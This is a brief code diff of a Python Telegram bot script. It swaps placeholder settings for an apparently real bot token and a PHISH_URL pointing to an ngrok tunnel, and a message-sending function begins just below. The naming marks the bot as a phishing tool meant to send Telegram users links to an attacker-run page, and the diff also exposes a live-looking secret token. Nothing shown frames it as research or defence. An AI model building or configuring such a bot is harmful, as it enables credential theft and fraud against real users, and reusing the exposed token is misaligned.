@@ -1,8 +1,8 @@
 import requests
 import time
 
-BOT_TOKEN = "urbottoken"
-PHISH_URL = "enter"
+BOT_TOKEN = "8497968985:AAFcPPPmvbYj6atitLNrgOt9eTnhIgoUmhk"
+PHISH_URL = "https://spotted-deafness-datebook.ngrok-free.dev"
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 def send_message(chat_id, text, reply_markup=None):
